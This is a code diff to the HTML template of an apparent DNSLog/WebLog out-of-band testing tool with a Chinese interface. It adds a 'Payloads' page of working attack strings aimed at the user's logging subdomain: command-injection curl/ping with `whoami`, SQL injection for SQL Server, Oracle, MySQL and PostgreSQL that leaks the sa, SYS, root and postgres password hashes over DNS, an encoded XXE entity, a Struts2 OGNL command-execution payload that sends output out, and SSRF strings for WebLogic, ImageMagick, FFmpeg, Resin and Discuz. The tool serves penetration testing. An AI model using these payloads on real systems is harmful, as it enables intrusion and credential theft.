@@ -31,10 +31,11 @@
         <nav class="navbar navbar-expand-lg navbar-light mb-3" style="background-color: #e3f2fd;">
             <ul class="nav nav-pills mr-auto">
                 <li class="nav-item mr-3" ><img src="/static/icon.png" height="40"/></li>
-              <li class="nav-item" ><a class="nav-link{% if type == 'dns' %} active{% endif %}" href="/dns/">DNSLog</a></li>
-              <li class="nav-item"><a class="nav-link{% if type == 'web' %} active{% endif %}" href="/web/">WebLog</a></li>
+                <li class="nav-item" ><a class="nav-link{% if type == 'dns' %} active{% endif %}" href="/dns/">DNSLog</a></li>
+                <li class="nav-item"><a class="nav-link{% if type == 'web' %} active{% endif %}" href="/web/">WebLog</a></li>
                 <li class="nav-item"><a class="nav-link{% if type == 'config' %} active{% endif %}" href="/config/">API</a></li>
                 <li class="nav-item"><a class="nav-link{% if type == 'rebind' %} active{% endif %}" href="/rebind/">Rebind</a></li>
+                <li class="nav-item"><a class="nav-link{% if type == 'payloads' %} active{% endif %}" href="/payloads/">Payloads</a></li>
                 {% if is_admin %}<li class="nav-item"><a class="nav-link" href="/as_admin/">Admin</a></li>{% endif %}
             </ul>
             <ul class="navbar-nav">
@@ -54,6 +55,7 @@
         <div>
             <input class="form-control mr-sm-2 input-sm" size="30" type="text" placeholder="域名" name="domain" value="{{ domain }}">
             <button class="btn btn-sm btn-primary my-2 my-sm-0" type="submit">搜索</button>
+            &nbsp;(子域名： <mark>{{userdomain}}</mark>)
         </div>
         {% include 'auto_reload.html' %}
         </form>
@@ -197,7 +199,7 @@
                                 <li>扫描器投递 <mark>payload3</mark>，使用域名：<mark>payload3.xxx-rce.{{userdomain}}</mark></li>
                                 <li>...</li>
                             </ul>
-                            <p>检查是否存在漏洞，访问：<a href="{{host}}/api/group/dns/{{username}}/xxx-rce/?token={{ token }}" target="_blank">{{host}}/api/group/dns/{{user_domain}}/xxx-rce/?token={{ token }}</a></p>
+                            <p>检查是否存在漏洞，访问：<a href="{{host}}/api/group/dns/{{username}}/xxx-rce/?token={{ token }}" target="_blank">{{host}}/api/group/dns/{{username}}/xxx-rce/?token={{ token }}</a></p>
                             <ul>
                                 <li>返回 <mark>False</mark>，漏洞未触发</li>
                                 <li>返回 <mark>{"success": "true", "data": ["payload3", "payload2", "payload1"]}</mark>，漏洞被触发，data字段包含成功触发的payload清单，至多返回50个</li>
@@ -254,6 +256,112 @@
                     </div>
                 </div>
             </div>
+        {% endif %}
+        {% if type == 'payloads'%}
+          <div class="mt-3">
+              <div class="card">
+                  <div class="card-body">
+                      <div class="card-header">
+                        一、命令执行场景
+                      </div>
+                      <div class="card-body">
+                        <p class="card-text">
+                          Liunx/Unix/Mac OS系统:
+                        </p>
+                        <p class="card-text">
+                          <mark>curl http://ip.port.{{ userdomain }}/`whoami`<br>ping `whoami`.ip.port.{{ userdomain }}</mark>
+                        </p>
+                        <p class="card-text">
+                          Windows系统:
+                        </p>
+                        <p class="card-text">
+                          <mark>ping %USERNAME%.{{ userdomain }}</mark>
+                        </p>
+                      </div>
+                      <div class="card-header">
+                        二、SQL注入场景
+                      </div>
+                      <div class="card-body">
+                        <p class="card-text">
+                          SQL Server数据库:
+                        </p>
+                        <p class="card-text">
+                          <mark>DECLARE @host varchar(1024);<br>SELECT @host=(SELECT TOP 1<br>master.dbo.fn_varbintohexstr(password_hash)<br>FROM sys.sql_logins WHERE name='sa')<br>+'.ip.port.{{ userdomain }}';<br>EXEC('master..xp_dirtree<br>"\\'+@host+'\foobar$"');</mark>
+                        </p>
+                        <p class="card-text">
+                          Oracle数据库:
+                        </p>
+                        <p class="card-text">
+                          <mark>SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.{{ userdomain }}');<br>SELECT UTL_HTTP.REQUEST('http://ip.port.{{ userdomain }}/oracle') FROM DUAL;<br>SELECT HTTPURITYPE('http://ip.port.{{ userdomain }}/oracle').GETCLOB() FROM DUAL;<br>SELECT DBMS_LDAP.INIT(('oracle.ip.port.{{ userdomain }}',80) FROM DUAL;<br>SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.{{ userdomain }}',80) FROM DUAL;</mark>
+                        </p>
+                        <p class="card-text">
+                          MySQL数据库:
+                        </p>
+                        <p class="card-text">
+                          <mark>SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.{{ userdomain }}\\abc'));</mark>
+                        </p>
+                        <p class="card-text">
+                          PostgreSQL数据库:
+                        </p>
+                        <p class="card-text">
+                          <mark>DROP TABLE IF EXISTS table_output;<br>CREATE TABLE table_output(content text);<br>CREATE OR REPLACE FUNCTION temp_function()<br>RETURNS VOID AS $<br>DECLARE exec_cmd TEXT;<br>DECLARE query_result TEXT;<br>BEGIN<br>SELECT INTO query_result (SELECT passwd<br>FROM pg_shadow WHERE usename='postgres');<br>exec_cmd := E'COPY table_output(content)<br>FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.{{ userdomain }}\\\\foobar.txt\'';<br>EXECUTE exec_cmd;<br>END;<br>$ LANGUAGE plpgsql SECURITY DEFINER;<br>SELECT temp_function();</mark>
+                        </p>
+                      </div>
+                      <div class="card-header">
+                        三、XXE场景
+                      </div>
+                      <div class="card-body">
+                        <p class="card-text">
+                          XML实体:
+                        </p>
+                        <p class="card-text">
+                          <mark>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x3f;&#x3e;<br>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x72;&#x6f;&#x6f;&#x74;&#x20;&#x5b;<br>&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x69;&#x70;&#x2e;&#x70;&#x6f;&#x72;&#x74;&#x2e;{{ userdomain }}&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;<br>&#x25;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x3b;&#x5d;&#x3e;<br>&#x3c;&#x72;&#x6f;&#x6f;&#x74;&#x2f;&#x3e;</mark>
+                        </p>
+                      </div>
+                      <div class="card-header">
+                        四、其他场景
+                      </div>
+                      <div class="card-body">
+                        <p class="card-text">
+                          Struts2中间件:
+                        </p>
+                        <p class="card-text">
+                          <mark>xx.action?redirect:http://ip.port.{{ userdomain }}/%25{3*4}<br>xx.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.{{ userdomain }}/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}</mark>
+                        </p>
+                        <p class="card-text">
+                          FFMpeg插件:
+                        </p>
+                        <p class="card-text">
+                          <mark>#EXTM3U<br>#EXT-X-MEDIA-SEQUENCE:0<br>#EXTINF:10.0,<br>concat:http://ip.port.{{ userdomain }}<br>#EXT-X-ENDLIST</mark>
+                        </p>
+                        <p class="card-text">
+                          Weblogic中间件:
+                        </p>
+                        <p class="card-text">
+                          <mark>example.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.{{ userdomain }}/test&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search</mark>
+                        </p>
+                        <p class="card-text">
+                          ImageMagick插件:
+                        </p>
+                        <p class="card-text">
+                          <mark>push graphic-context<br>viewbox 0 0 640 480<br>fill 'url(http://ip.port.{{ userdomain }})'<br>pop graphic-context</mark>
+                        </p>
+                        <p class="card-text">
+                          Resin中间件:
+                        </p>
+                        <p class="card-text">
+                          <mark>example.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.{{ userdomain }}/ssrf</mark>
+                        </p>
+                        <p class="card-text">
+                          Discuz社群:
+                        </p>
+                        <p class="card-text">
+                          <mark>example.com/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://ip.port.{{ userdomain }}/x.jpg[/img]&formhash=x</mark>
+                        </p>
+                      </div>
+                  </div>
+              </div>
+          </div>
         {% endif %}
     </div>
 
